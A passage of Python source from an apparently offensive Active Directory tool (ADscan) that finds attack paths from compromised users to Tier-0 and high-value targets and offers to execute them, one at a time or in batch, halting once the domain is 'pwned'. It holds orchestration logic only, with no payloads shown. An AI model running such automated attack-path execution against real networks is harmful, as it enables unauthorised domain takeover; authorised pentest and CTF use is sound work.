                last_executable_idx=last_executable_idx,
                step_status="completed",
            )
        return execution_started

    finally:
        try:
            if cleanup_scope_owner and local_cleanup_scope_id:
                execute_cleanup_scope(shell, scope_id=local_cleanup_scope_id)
        finally:
            if cleanup_scope_owner and local_cleanup_scope_id:
                discard_cleanup_scope(shell, scope_id=local_cleanup_scope_id)
            clear_attack_path_execution(shell)


def offer_attack_paths_for_execution(
    shell: Any,
    domain: str,
    *,
    start: str,
    max_depth: int = 10,
    max_display: int = 20,
    target: str = "highvalue",
    target_mode: str = "tier0",
    context_username: str | None = None,
    context_password: str | None = None,
    allow_execute_all: bool = False,
    default_execute_all: bool = False,
    execute_only_statuses: set[str] | None = None,
    retry_attempted: bool = False,
) -> bool:
    """Offer attack paths to the user and optionally execute one.

    Args:
        shell: Shell instance with `_questionary_select` (optional) and attack actions.
        domain: Target domain.
        start: Either a username label or the special value `owned`.
        max_depth: Max path depth for pathfinding.
        max_display: Max number of paths to show in the summary and selection.
        target: Target scope — ``"highvalue"`` (default), ``"all"``, or ``"lowpriv"``.
        context_username/context_password: When provided, use these credentials for
            execution attempts (useful for `ask_for_user_privs` flows).

    Returns:
        True if an execution attempt was started, False otherwise.
    """
    start_norm = (start or "").strip().lower()
    _compute_summaries = _build_attack_path_summary_provider(
        shell,
        domain=domain,
        start=start,
        max_depth=max_depth,
        target=target,
        target_mode=target_mode,
    )

    try:
        summaries = _compute_summaries()
    except RecursionError as exc:
        telemetry.capture_exception(exc)
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            "Attack-path computation failed while expanding nested group memberships "
            f"for {marked_domain}. The environment appears to have deep or cyclic "
            "group nesting."
        )
        return False
    if not summaries:
        _print_no_attack_paths_warning(
            domain=domain,
            start=start,
            start_norm=start_norm,
            target=target,
            target_mode=target_mode,
        )
        return False

    return offer_attack_paths_for_execution_summaries(
        shell,
        domain,
        summaries=summaries,
        max_display=max_display,
        search_mode_label=_target_search_mode_label(
            target=target, target_mode=target_mode
        ),
        context_username=context_username,
        context_password=context_password,
        allow_execute_all=allow_execute_all,
        default_execute_all=default_execute_all,
        execute_only_statuses=execute_only_statuses,
        retry_attempted=retry_attempted,
        recompute_summaries=_compute_summaries,
    )


def _target_scope_label(*, target: str, target_mode: str) -> str:
    """Return a user-facing label for the current target filtering mode."""
    if target == "all":
        return "all targets"
    if target == "lowpriv":
        return "low-privilege targets"
    if str(target_mode or "impact").strip().lower() == "tier0":
        return "Tier-0 targets"
    return "high-value targets"


def _target_search_mode_label(*, target: str, target_mode: str) -> str:
    """Return a compact label describing the current attack-path search mode."""
    if target == "all":
        return "Pivot Search"
    if target == "lowpriv":
        return "Low-Priv Search"
    if str(target_mode or "impact").strip().lower() == "tier0":
        return "Tier-0 Search"
    return "High-Value Search"


def _resolve_summary_search_mode_label(
    summary: dict[str, Any],
    *,
    default_search_mode_label: str | None,
    show_sections: bool,
) -> str | None:
    """Return the effective search-mode label for one rendered/executed path.

    When the UX is rendering mixed high-value + pivot results in one table
    (`target=all`), the runtime follow-up logic must key off the selected path,
    not off a single global label for the whole screen. Otherwise pivot-only
    follow-ups get skipped for non-HV paths shown in the merged view.
    """
    if show_sections:
        return _summary_search_mode_label(summary)
    return default_search_mode_label


def _print_no_attack_paths_warning(
    *,
    domain: str,
    start: str,
    start_norm: str,
    target: str,
    target_mode: str,
) -> None:
    """Emit a consistent warning when no attack paths are available."""
    marked_domain = mark_sensitive(domain, "domain")
    scope = _target_scope_label(
        target=target,
        target_mode=target_mode,
    )
    if start_norm == "owned":
        print_warning(
            f"No attack paths found from owned users to {scope} for {marked_domain}."
        )
        return
    marked_user = mark_sensitive(start, "user")
    print_warning(
        f"No attack paths found for {marked_user} to {scope} in {marked_domain}."
    )


def _build_attack_path_summary_provider(
    shell: Any,
    *,
    domain: str,
    start: str,
    max_depth: int,
    target: str,
    target_mode: str,
) -> Callable[[], list[dict[str, Any]]]:
    """Build a reusable summary provider for a specific attack-path scope."""
    start_norm = (start or "").strip().lower()

    def _compute_summaries() -> list[dict[str, Any]]:
        if start_norm == "owned":
            owned_users = get_owned_domain_usernames_for_attack_paths(shell, domain)
            if not owned_users:
                return []
            return get_attack_path_summaries(
                shell,
                domain,
                scope="owned",
                max_depth=max_depth,
                max_paths=None,
                target=target,
                target_mode=target_mode,
            )

        marked_domain = mark_sensitive(domain, "domain")
        marked_user = mark_sensitive(start, "user")
        print_info(f"Searching attack paths for {marked_user} in {marked_domain}...")
        return get_attack_path_summaries(
            shell,
            domain,
            scope="user",
            username=start,
            max_depth=max_depth,
            max_paths=None,
            target=target,
            target_mode=target_mode,
        )

    return _compute_summaries


def offer_attack_paths_with_non_high_value_fallback(
    shell: Any,
    domain: str,
    *,
    start: str,
    max_depth: int = 10,
    max_display: int = 20,
    target: str = "highvalue",
    target_mode: str = "tier0",
    context_username: str | None = None,
    context_password: str | None = None,
    allow_execute_all: bool = False,
    default_execute_all: bool = False,
    execute_only_statuses: set[str] | None = None,
    retry_attempted: bool = False,
    snapshot_scope: str | None = None,
) -> bool:
    """Offer attack paths, with optional prioritized-target fallback broadening.

    When ``target`` is ``"highvalue"`` (default):
        - Shows Tier-0 or high-value paths first.
        - In ``ctf`` mode automatically broadens to all targets when none found.
        - In ``audit`` mode prompts the operator before broadening.

    When ``target`` is ``"all"`` or ``"lowpriv"``:
        - Goes directly to that target mode without the narrowing prompt flow.
        - Intended for bounded scopes (single user, owned) where running the
          broader query is affordable.
    """
    start_norm = (start or "").strip().lower()

    if target != "highvalue":
        # Direct mode — skip the narrowing/fallback prompt, go straight to target.
        direct_compute = _build_attack_path_summary_provider(
            shell,
            domain=domain,
            start=start,
            max_depth=max_depth,
            target=target,
            target_mode=target_mode,
        )
        try:
            direct_summaries = direct_compute()
        except RecursionError as exc:
            telemetry.capture_exception(exc)
            print_error(
                "Attack-path computation failed while expanding nested group memberships "
                f"for {mark_sensitive(domain, 'domain')}. The environment appears to have "
                "deep or cyclic group nesting."
            )
            return False
        if not direct_summaries:
            _print_no_attack_paths_warning(
                domain=domain,
                start=start,
                start_norm=start_norm,
                target=target,
                target_mode=target_mode,
            )
            return False
        if target == "all":
            return _offer_sectioned_attack_paths(
                shell,
                domain,
                summaries=direct_summaries,
                max_display=max_display,
                target_mode=target_mode,
                context_username=context_username,
                context_password=context_password,
                allow_execute_all=allow_execute_all,
                default_execute_all=default_execute_all,
                execute_only_statuses=execute_only_statuses,
                retry_attempted=retry_attempted,
                recompute_summaries=direct_compute,
                snapshot_scope=snapshot_scope or start_norm or "domain",
                snapshot_target="all",
                snapshot_target_mode=target_mode,
            )
        return offer_attack_paths_for_execution_summaries(
            shell,
            domain,
            summaries=direct_summaries,
            max_display=max_display,
            search_mode_label=_target_search_mode_label(target=target, target_mode=target_mode),
            context_username=context_username,
            context_password=context_password,
            allow_execute_all=allow_execute_all,
            default_execute_all=default_execute_all,
            execute_only_statuses=execute_only_statuses,
            retry_attempted=retry_attempted,
            recompute_summaries=direct_compute,
            snapshot_scope=snapshot_scope or start_norm or "domain",
            snapshot_target=target,
            snapshot_target_mode=target_mode,
        )

    primary_compute = _build_attack_path_summary_provider(
        shell,
        domain=domain,
        start=start,
        max_depth=max_depth,
        target="highvalue",
        target_mode=target_mode,
    )
    try:
        primary_summaries = primary_compute()
    except RecursionError as exc:
        telemetry.capture_exception(exc)
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            "Attack-path computation failed while expanding nested group memberships "
            f"for {marked_domain}. The environment appears to have deep or cyclic "
            "group nesting."
        )
        return False

    if primary_summaries:
        return offer_attack_paths_for_execution_summaries(
            shell,
            domain,
            summaries=primary_summaries,
            max_display=max_display,
            search_mode_label=_target_search_mode_label(
                target="highvalue", target_mode=target_mode
            ),
            context_username=context_username,
            context_password=context_password,
            allow_execute_all=allow_execute_all,
            default_execute_all=default_execute_all,
            execute_only_statuses=execute_only_statuses,
            retry_attempted=retry_attempted,
            recompute_summaries=primary_compute,
            snapshot_scope=snapshot_scope or start_norm or "domain",
            snapshot_target="highvalue",
            snapshot_target_mode=target_mode,
        )

    _print_no_attack_paths_warning(
        domain=domain,
        start=start,
        start_norm=start_norm,
        target="highvalue",
        target_mode=target_mode,
    )

    fallback_default = str(getattr(shell, "type", "")).strip().lower() == "ctf"
    marked_domain = mark_sensitive(domain, "domain")
    subject = (
        "owned users" if start_norm == "owned" else mark_sensitive(start, "user")
    )

    message = Text()
    message.append(
        "No paths to Tier-0 or high-value targets were discovered from the current foothold.\n\n",
        style="bold yellow",
    )
    message.append("Scope: ", style="bold")
    message.append(f"{subject}\n")
    message.append("Domain: ", style="bold")
    message.append(f"{marked_domain}\n\n")
    message.append(
        "ADscan can broaden the search to non-high-value targets to identify "
        "pivot opportunities, intermediate control points, and lower-privilege "
        "expansion paths.",
        style="yellow",
    )

    title = (
        "Broadening Attack Path Search"
        if fallback_default
        else "Optional Pivot Path Enumeration"
    )
    print_panel(message, title=title, border_style="yellow", expand=False)

    broaden_search = fallback_default
    if not fallback_default:
        if is_non_interactive(shell=shell):
            print_info_debug(
                "[attack_paths] non-high-value fallback skipped: "
                f"domain={marked_domain} scope={mark_sensitive(start_norm or start, 'text')}"
            )
            broaden_search = False
        else:
            broaden_search = Confirm.ask(
                "Do you want to broaden the search to non-high-value targets now?",
                default=False,
            )
    else:
        print_info(
            "CTF mode active: broadening attack-path search to all reachable targets."
        )

    if not broaden_search:
        return False

    fallback_compute = _build_attack_path_summary_provider(
        shell,
        domain=domain,
        start=start,
        max_depth=max_depth,
        target="all",
        target_mode=target_mode,
    )
    try:
        fallback_summaries = fallback_compute()
    except RecursionError as exc:
        telemetry.capture_exception(exc)
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            "Attack-path computation failed while expanding nested group memberships "
            f"for {marked_domain}. The environment appears to have deep or cyclic "
            "group nesting."
        )
        return False

    if not fallback_summaries:
        _print_no_attack_paths_warning(
            domain=domain,
            start=start,
            start_norm=start_norm,
            target="all",
            target_mode=target_mode,
        )
        return False

    return offer_attack_paths_for_execution_summaries(
        shell,
        domain,
        summaries=fallback_summaries,
        max_display=max_display,
        search_mode_label=_target_search_mode_label(
            target="all", target_mode=target_mode
        ),
        context_username=context_username,
        context_password=context_password,
        allow_execute_all=allow_execute_all,
        default_execute_all=default_execute_all,
        execute_only_statuses=execute_only_statuses,
        retry_attempted=retry_attempted,
        recompute_summaries=fallback_compute,
        snapshot_scope=snapshot_scope or start_norm or "domain",
        snapshot_target="all",
        snapshot_target_mode=target_mode,
    )


def _offer_sectioned_attack_paths(
    shell: Any,
    domain: str,
    *,
    summaries: list[dict[str, Any]],
    max_display: int = 20,
    target_mode: str = "tier0",
    context_username: str | None = None,
    context_password: str | None = None,
    allow_execute_all: bool = False,
    default_execute_all: bool = False,
    execute_only_statuses: set[str] | None = None,
    retry_attempted: bool = False,
    recompute_summaries: Any = None,
    snapshot_scope: str = "domain",
    snapshot_target: str = "all",
    snapshot_target_mode: str = "tier0",
) -> bool:
    """Display attack paths grouped Tier-0, then high-value, then pivots."""
    merged = _sort_target_priority_groups(summaries)

    # Wrap recompute so refreshed results are also re-grouped by priority class.
    _orig_recompute = recompute_summaries

    def _recompute_sorted() -> list[dict[str, Any]]:
        fresh = _orig_recompute() if callable(_orig_recompute) else merged
        return _sort_target_priority_groups(fresh)

    return offer_attack_paths_for_execution_summaries(
        shell,
        domain,
        summaries=merged,
        show_sections=True,
        max_display=max_display,
        context_username=context_username,
        context_password=context_password,
        allow_execute_all=allow_execute_all,
        default_execute_all=default_execute_all,
        execute_only_statuses=execute_only_statuses,
        retry_attempted=retry_attempted,
        recompute_summaries=_recompute_sorted,
        snapshot_scope=snapshot_scope,
        snapshot_target=snapshot_target,
        snapshot_target_mode=snapshot_target_mode,
    )


def offer_attack_paths_for_execution_for_principals(
    shell: Any,
    domain: str,
    *,
    principals: list[str],
    max_depth: int = 10,
    max_display: int = 20,
    target: str = "highvalue",
    target_mode: str = "tier0",
    context_username: str | None = None,
    context_password: str | None = None,
    allow_execute_all: bool = False,
    default_execute_all: bool = False,
    execute_only_statuses: set[str] | None = None,
    retry_attempted: bool = False,
) -> bool:
    """Offer attack paths for a list of user principals and optionally execute one.

    This is used by batch credential discovery flows (e.g. password spraying)
    to avoid printing one identical group-originating path per user.
    """

    def _compute_summaries() -> list[dict[str, Any]]:
        return get_attack_path_summaries(
            shell,
            domain,
            scope="principals",
            principals=principals,
            max_depth=max_depth,
            max_paths=None,
            target=target,
            target_mode=target_mode,
        )

    try:
        summaries = _compute_summaries()
    except RecursionError as exc:
        telemetry.capture_exception(exc)
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            "Attack-path computation failed while expanding nested group memberships "
            f"for {marked_domain}. The environment appears to have deep or cyclic "
            "group nesting."
        )
        return False

    if target == "all":
        return _offer_sectioned_attack_paths(
            shell,
            domain,
            summaries=summaries,
            max_display=max_display,
            target_mode=target_mode,
            context_username=context_username,
            context_password=context_password,
            allow_execute_all=allow_execute_all,
            default_execute_all=default_execute_all,
            execute_only_statuses=execute_only_statuses,
            retry_attempted=retry_attempted,
            recompute_summaries=_compute_summaries,
            snapshot_scope="principals",
            snapshot_target="all",
            snapshot_target_mode=target_mode,
        )

    return offer_attack_paths_for_execution_summaries(
        shell,
        domain,
        summaries=summaries,
        max_display=max_display,
        search_mode_label=_target_search_mode_label(target=target, target_mode=target_mode),
        context_username=context_username,
        context_password=context_password,
        allow_execute_all=allow_execute_all,
        default_execute_all=default_execute_all,
        execute_only_statuses=execute_only_statuses,
        retry_attempted=retry_attempted,
        recompute_summaries=_compute_summaries,
        snapshot_scope="principals",
        snapshot_target=target,
        snapshot_target_mode=target_mode,
    )


def offer_attack_paths_for_execution_summaries(
    shell: Any,
    domain: str,
    *,
    summaries: list[dict[str, Any]] | None,
    max_display: int = 20,
    search_mode_label: str | None = None,
    show_sections: bool = False,
    context_username: str | None = None,
    context_password: str | None = None,
    allow_execute_all: bool = False,
    default_execute_all: bool = False,
    execute_only_statuses: set[str] | None = None,
    retry_attempted: bool = False,
    recompute_summaries: Callable[[], list[dict[str, Any]]] | None = None,
    snapshot_scope: str = "domain",
    snapshot_target: str = "highvalue",
    snapshot_target_mode: str = "tier0",
    auto_continue_theoretical_in_non_interactive: bool = False,
) -> bool:
    """Shared UX loop for showing/executing already computed path summaries.

    When ``show_sections=True`` the table renders Tier-0 first, then
    high-value paths, then pivots. Callers must pass summaries pre-grouped
    in that order.
    """
    if not summaries:
        return False

    marked_domain = mark_sensitive(domain, "domain")

    # Track whether the domain was already compromised when we entered the UX.
    # If execution flips the domain into "pwned" during this session, we stop
    # offering additional paths to avoid noisy/redundant prompts.
    was_pwned_at_start = (
        getattr(shell, "domains_data", {}).get(domain, {}).get("auth") == "pwned"
        if isinstance(getattr(shell, "domains_data", None), dict)
        else False
    )

    non_interactive = is_non_interactive(shell=shell)

    print_info_debug(
        "[attack_paths] UX start: "
        f"domain={marked_domain} non_interactive={non_interactive!r} "
        f"was_pwned_at_start={was_pwned_at_start!r} "
        f"summaries={len(summaries) if isinstance(summaries, list) else 0}"
    )

    def _is_theoretical_status(value: object) -> bool:
        return str(value or "").strip().lower() == "theoretical"

    def _confirm_or_default(prompt: str, *, default: bool) -> bool:
        """Return `default` in non-interactive contexts to avoid blocking for input."""
        if hasattr(shell, "_questionary_confirm"):
            resolved = shell._questionary_confirm(
                prompt,
                default=default,
                timeout_result=False,
                context={
                    "remote_interaction": True,
                    "category": "attack_path_execution",
                    "domain": domain,
                },
            )
            if isinstance(resolved, bool):
                return resolved
        if non_interactive:
            print_info_debug(
                "[attack_paths] confirm defaulted (non-interactive): "
                f"domain={marked_domain} prompt={mark_sensitive(prompt, 'detail')} default={default!r}"
            )
            return default
        return Confirm.ask(prompt, default=default)

    def _refresh_summaries() -> list[dict[str, Any]]:
        if recompute_summaries is None:
            updated = _sorted_paths(list(summaries))
        else:
            updated = _sorted_paths(list(recompute_summaries() or []))
        return _annotate_execution_readiness(
            shell,
            domain=domain,
            summaries=updated,
            context_username=context_username,
            context_password=context_password,
        )

    def _domain_now_pwned() -> bool:
        domains_data = getattr(shell, "domains_data", None)
        if not isinstance(domains_data, dict):
            return False
        domain_data = domains_data.get(domain, {})
        if not isinstance(domain_data, dict):
            return False
        return domain_data.get("auth") == "pwned"

    desired_statuses = (
        {str(s).strip().lower() for s in execute_only_statuses}
        if execute_only_statuses
        else None
    )
    desired_statuses_set = (
        desired_statuses if isinstance(desired_statuses, set) else None
    )

    # Initial annotation: the summaries passed by the caller are already fresh
    # (just computed). Annotate them in-place without calling recompute_summaries,
    # which would trigger a redundant full recomputation (including any interactive
    # engine selector). The recompute_summaries callback is reserved for subsequent
    # refresh calls after a path has been executed.
    summaries = _annotate_execution_readiness(
        shell,
        domain=domain,
        summaries=_sorted_paths(list(summaries)),
        context_username=context_username,
        context_password=context_password,
    )
    # When rendering grouped sections, re-group after sorting so the class
    # buckets remain stable while preserving relative order within each class.
    if show_sections:
        summaries = _sort_target_priority_groups(summaries)
    persist_attack_path_snapshot(
        shell,
        domain,
        summaries=summaries,
        scope=snapshot_scope,
        target=snapshot_target,
        target_mode=snapshot_target_mode,
        search_mode_label=search_mode_label,
    )
    print_info_debug(
        f"[attack_paths] summaries refreshed: domain={marked_domain} count={len(summaries)}"
    )
    actionable_paths = [
        summary
        for summary in summaries
        if _path_is_actionable_for_execution_prompt(
            summary, desired_statuses=desired_statuses_set
        )
    ]
    print_attack_paths_summary(
        domain,
        summaries,
        max_display=min(max_display, len(summaries)),
        search_mode_label=search_mode_label,
        actionable_count=len(actionable_paths),
        show_sections=show_sections,
    )
    if not actionable_paths:
        non_actionable_total, reasons = _summarize_non_actionable_paths(
            summaries,
            desired_statuses=desired_statuses_set,
        )
        reason_summary = _format_non_actionable_reason_summary(reasons)
        if reasons["needs_context"] > 0 and non_actionable_total == reasons["needs_context"]:
            print_warning(
                "No actionable attack paths are currently executable because the "
                "available paths have no usable execution credential context."
            )
        elif reasons["unsupported"] > 0 and non_actionable_total == reasons["unsupported"]:
            print_warning(
                "No actionable attack paths are currently executable because the "
                "available paths are not implemented for execution."
            )
        else:
            print_info(
                "No actionable attack paths are currently executable. "
                "You can still inspect the discovered paths."
            )
        print_info(f"Current path summary: {reason_summary}")
        print_info_debug(
            "[attack_paths] initial list has no actionable paths; keeping detail UX enabled: "
            f"domain={marked_domain} non_actionable={non_actionable_total} "
            f"exploited={reasons['exploited']} blocked={reasons['blocked']} "
            f"unsupported={reasons['unsupported']} unavailable={reasons['unavailable']} "
            f"needs_context={reasons['needs_context']} filtered={reasons['status_filtered']} "
            f"other={reasons['other']}"
        )

    executed = False

    # In non-interactive contexts we usually run a single selection cycle and
    # return. CI can opt into a safer chained mode that executes one
    # theoretical path at a time, recomputes, and repeats until no theoretical
    # candidates remain. This avoids the redundancy of a static "execute all"
    # batch while still converging to a fixpoint automatically.
    single_pass = non_interactive and not auto_continue_theoretical_in_non_interactive

    while True:
        options = [
            f"{idx + 1}. {summary.get('source')} -> {summary.get('target')} [{summary.get('status')}]"
            for idx, summary in enumerate(summaries[:max_display])
        ]
        if allow_execute_all:
            options.append("Execute all remaining attack paths (recommended for CI)")
        options.append("Skip attack path execution")

        execute_all_idx = len(options) - 2 if allow_execute_all else None
        skip_idx = len(options) - 1
        # Default selection rule:
        # - If batch execution is enabled and explicitly defaulted, prefer the batch option
        #   when there is at least one eligible candidate.
        # - Otherwise pick the first theoretical path; if none exist, default to Skip.
        default_idx = skip_idx
        if allow_execute_all and default_execute_all and execute_all_idx is not None:
            candidates_exist = any(
                (
                    (
                        str(summary.get("status") or "theoretical").strip().lower()
                        != "exploited"
                    )
                    and _status_allowed_by_filter(
                        str(summary.get("status") or "theoretical").strip().lower(),
                        desired_statuses_set,
                    )
                )
                for summary in summaries
            )
            if candidates_exist:
                default_idx = execute_all_idx
        if default_idx == skip_idx:
            default_idx = next(
                (
                    idx
                    for idx, summary in enumerate(summaries[:max_display])
                    if _is_theoretical_status(summary.get("status"))
                ),
                skip_idx,
            )

        selected_idx = None
        if hasattr(shell, "_questionary_select"):
            try:
                selected_idx = shell._questionary_select(
                    "Select an attack path to view details:",
                    options,
                    default_idx=default_idx,
                    context={
                        "remote_interaction": True,
                        "category": "attack_path_execution",
                        "domain": domain,
                        "candidate_count": len(summaries),
                    },
                )
            except TypeError:
                selected_idx = shell._questionary_select(
                    "Select an attack path to view details:",
                    options,
                    default_idx=default_idx,
                )
        elif non_interactive:
            selected_idx = default_idx
        else:
            prompt_default = "0" if default_idx >= skip_idx else str(default_idx + 1)
            selection = Prompt.ask(
                "Select an attack path index (or 0 to skip)", default=prompt_default
            )
            try:
                selection_idx = int(selection)
            except ValueError:
                selection_idx = 0
            if selection_idx <= 0:
                selected_idx = len(options) - 1
            else:
                selected_idx = min(selection_idx - 1, len(options) - 1)

        if selected_idx is None:
            print_info_debug(
                f"[attack_paths] selection cancelled: domain={marked_domain}"
            )
            return executed

        if selected_idx >= skip_idx:
            print_info_debug(
                f"[attack_paths] user skipped execution: domain={marked_domain}"
            )
            return executed

        if (
            allow_execute_all
            and execute_all_idx is not None
            and selected_idx == execute_all_idx
        ):
            # Batch execution mode: attempt remaining theoretical paths (by default)
            candidates: list[dict[str, Any]] = []
            skipped_no_context = 0
            skipped_unsupported = 0
            skipped_blocked = 0
            for summary in summaries:
                status = str(summary.get("status") or "theoretical").strip().lower()
                if not _status_allowed_by_filter(status, desired_statuses_set):
                    continue
                if not retry_attempted and status == "attempted":
                    continue
                if status == "exploited":
                    continue
                meta = summary.get("meta") if isinstance(summary.get("meta"), dict) else {}
                support_status = (
                    str(meta.get("execution_support_status") or "").strip().lower()
                    if isinstance(meta, dict)
                    else ""
                )
                if support_status == "blocked":
                    skipped_blocked += 1
                    continue
                if not _path_is_supported_for_execution(summary):
                    skipped_unsupported += 1
                    continue
                if not _path_has_ready_execution_context(summary):
                    skipped_no_context += 1
                    continue
                candidates.append(summary)

            if not candidates:
                if skipped_unsupported > 0:
                    print_warning(
                        "No remaining attack paths are supported for execution with "
                        "their current target types."
                    )
                    print_info_debug(
                        "[attack_paths] batch: "
                        f"domain={marked_domain} skipped_unsupported={skipped_unsupported}"
                    )
                if skipped_blocked > 0:
                    print_warning(
                        "No remaining attack paths are executable because their target "
                        "hosts are currently not viable from this vantage."
                    )
                    print_info_debug(
                        "[attack_paths] batch: "
                        f"domain={marked_domain} skipped_blocked={skipped_blocked}"
                    )
                if skipped_no_context > 0:
                    print_warning(
                        "No remaining attack paths are currently executable with the "
                        "stored credential context."
                    )
                    print_info_debug(
                        "[attack_paths] batch: "
                        f"domain={marked_domain} skipped_no_context={skipped_no_context}"
                    )
                print_info_verbose("No remaining attack paths eligible for execution.")
                print_info_debug(
                    f"[attack_paths] batch: domain={marked_domain} no eligible candidates"
                )
                return executed

            if skipped_unsupported > 0:
                print_info(
                    f"Skipping {skipped_unsupported} attack path(s) that are not "
                    "implemented for their current target types."
                )
                print_info_debug(
                    "[attack_paths] batch support pre-check: "
                    f"domain={marked_domain} eligible={len(candidates)} "
                    f"skipped_unsupported={skipped_unsupported}"
                )
            if skipped_blocked > 0:
                print_info(
                    f"Skipping {skipped_blocked} attack path(s) whose target hosts are "
                    "not currently viable from this vantage."
                )
                print_info_debug(
                    "[attack_paths] batch host-viability pre-check: "
                    f"domain={marked_domain} eligible={len(candidates)} "
                    f"skipped_blocked={skipped_blocked}"
                )
            if skipped_no_context > 0:
                print_info(
                    f"Skipping {skipped_no_context} attack path(s) with no usable "
                    "execution credential context."
                )
                print_info_debug(
                    "[attack_paths] batch pre-check: "
                    f"domain={marked_domain} eligible={len(candidates)} "
                    f"skipped_no_context={skipped_no_context}"
                )

            if not _confirm_or_default(
                f"Execute {len(candidates)} attack path(s) now?",
                # If the user picked the batch option, default to yes; in CI/non-interactive
                # we should not block for input.
                default=True,
            ):
                continue

            for idx, summary in enumerate(candidates, start=1):
                try:
                    print_info_debug(
                        f"[batch] Executing attack path {idx}/{len(candidates)}: "
                        f"{summary.get('source')} -> {summary.get('target')} [{summary.get('status')}]"
                    )
                    attempted = execute_selected_attack_path(
                        shell,
                        domain,
                        summary=summary,
                        context_username=context_username,
                        context_password=context_password,
                        search_mode_label=_resolve_summary_search_mode_label(
                            summary,
                            default_search_mode_label=search_mode_label,
                            show_sections=show_sections,
                        ),
                    )
                    executed = executed or attempted
                    if attempted and not was_pwned_at_start and _domain_now_pwned():
                        print_info_debug(
                            "[attack_paths] stopping after compromise: "
                            f"domain={marked_domain} auth transitioned to pwned"
                        )
                        return executed
                except Exception as exc:  # noqa: BLE001
                    telemetry.capture_exception(exc)
                    # Keep going; execution is best-effort.
                    continue
            return executed

        selected = summaries[selected_idx]
        selected_search_mode_label = _resolve_summary_search_mode_label(
            selected,
            default_search_mode_label=search_mode_label,
            show_sections=show_sections,
        )
        print_attack_path_detail(
            domain,
            selected,
            index=selected_idx + 1,
            search_mode_label=selected_search_mode_label,
        )

        status = str(selected.get("status") or "theoretical").lower()
        selected_meta = selected.get("meta") if isinstance(selected.get("meta"), dict) else {}
        execution_context_required = bool(
            isinstance(selected_meta, dict)
            and selected_meta.get("execution_context_required")
        )
        execution_support_status = (
            str(selected_meta.get("execution_support_status") or "").strip().lower()
            if isinstance(selected_meta, dict)
            else ""
        )
        if execution_support_status == "blocked":
            warning_message, debug_reason = _execution_block_message(selected_meta)
            marked_action = mark_sensitive(
                str(selected_meta.get("execution_context_action") or "step"),
                "detail",
            )
            print_warning(warning_message)
            print_info_debug(
                "[attack_paths] execution pre-check blocked: "
                f"domain={marked_domain} action={marked_action} "
                f"reason={mark_sensitive(debug_reason, 'detail')}"
            )
            blocked_target_label = str(
                selected_meta.get("execution_target_label")
                or selected.get("target")
                or ""
            ).strip()
            blocked_viability_status = str(
                selected_meta.get("execution_target_viability_status") or ""
            ).strip()
            if blocked_target_label and blocked_viability_status in {
                "resolved_but_unreachable",
                "enabled_but_unresolved",
                "not_in_enabled_inventory",
            }:
                maybe_offer_pivot_opportunity_for_host_viability(
                    shell,
                    domain=domain,
                    blocked_target=blocked_target_label,
                    viability_status=blocked_viability_status,
                    operator_summary=None,
                )
            if single_pass:
                return executed
            continue
        if execution_support_status == "unsupported":
            marked_action = mark_sensitive(
                str(selected_meta.get("execution_context_action") or "step"),
                "detail",
            )
            marked_reason = mark_sensitive(
                str(
                    selected_meta.get("execution_support_reason")
                    or "Unsupported target type"
                ),
                "detail",
            )
            print_warning(
                "This path is not currently implemented for execution with its "
                "current target type."
            )
            print_info_debug(
                "[attack_paths] execution pre-check blocked: "
                f"domain={marked_domain} action={marked_action} reason={marked_reason}"
            )
            if single_pass:
                return executed
            continue
        execution_ready_count = (
            selected_meta.get("execution_ready_count")
            if isinstance(selected_meta, dict)
            else None
        )
        computer_viability_status = (
            str(selected_meta.get("execution_target_viability_status") or "").strip().lower()
            if isinstance(selected_meta, dict)
            else ""
        )
        computer_viability_summary = (
            str(selected_meta.get("execution_target_viability_summary") or "").strip()
            if isinstance(selected_meta, dict)
            else ""
        )
        computer_execution_advisory = (
            str(selected_meta.get("execution_target_execution_advisory") or "").strip()
            if isinstance(selected_meta, dict)
            else ""
        )
        if (
            execution_context_required
            and isinstance(execution_ready_count, int)
            and execution_ready_count <= 0
        ):
            marked_action = mark_sensitive(
                str(selected_meta.get("execution_context_action") or "step"),
                "detail",
            )
            marked_reason = mark_sensitive(
                str(
                    selected_meta.get("execution_readiness_reason")
                    or "no_usable_execution_context"
                ),
                "detail",
            )
            print_warning(
                "This path currently has no usable execution credential context. "
                "Acquire a stored credential for one of the affected users or pick another path."
            )
            print_info_debug(
                "[attack_paths] execution pre-check blocked: "
                f"domain={marked_domain} action={marked_action} reason={marked_reason}"
            )
            if single_pass:
                return executed
            continue
        if computer_viability_status in {
            "resolved_but_unreachable",
            "enabled_but_unresolved",
            "not_in_enabled_inventory",
        }:
            if computer_viability_summary:
                print_warning(
                    f"Computer target viability check: {computer_viability_summary}"
                )
            if computer_execution_advisory:
                print_info(
                    f"Execution advisory: {computer_execution_advisory}"
                )
            print_info_debug(
                "[attack_paths] computer target viability warning: "
                f"domain={marked_domain} status={mark_sensitive(computer_viability_status, 'detail')}"
            )

        if status == "exploited" and not _confirm_or_default(
            "This path is already exploited. Execute again?",
            default=False,
        ):
            print_info_debug(
                f"[attack_paths] execution skipped: domain={marked_domain} reason=already_exploited_no_reexec"
            )
            if single_pass:
                return executed
            continue
        if desired_statuses_set is not None and not _status_allowed_by_filter(
            status, desired_statuses_set
        ):
            print_info_verbose(
                f"Skipping execution for this path (status={status}) due to execution filter."
            )
            print_info_debug(
                "[attack_paths] execution skipped: "
                f"domain={marked_domain} reason=status_filtered status={mark_sensitive(status, 'detail')}"
            )
            if single_pass:
                return executed
            continue

        if not _confirm_or_default(
            "Execute this attack path now?",
            default=True,
        ):
            print_info_debug(
                f"[attack_paths] execution skipped: domain={marked_domain} reason=user_declined"
            )
            if single_pass:
                return executed
            continue

        executed = execute_selected_attack_path(
            shell,
            domain,
            summary=selected,
            context_username=context_username,
            context_password=context_password,
            search_mode_label=selected_search_mode_label,
        )
        if executed:
            if not was_pwned_at_start and _domain_now_pwned():
                print_info_debug(
                    "[attack_paths] stopping after compromise: "
                    f"domain={marked_domain} auth transitioned to pwned"
                )
                return True
            if single_pass:
                return True
            affected_count = _affected_user_count(selected)
            if (
                recompute_summaries is not None
                and _AUTO_REFRESH_AFFECTED_USERS_THRESHOLD > 0
                and affected_count >= _AUTO_REFRESH_AFFECTED_USERS_THRESHOLD
            ):
                print_info(
                    "Execution completed. Skipping automatic attack-path refresh "
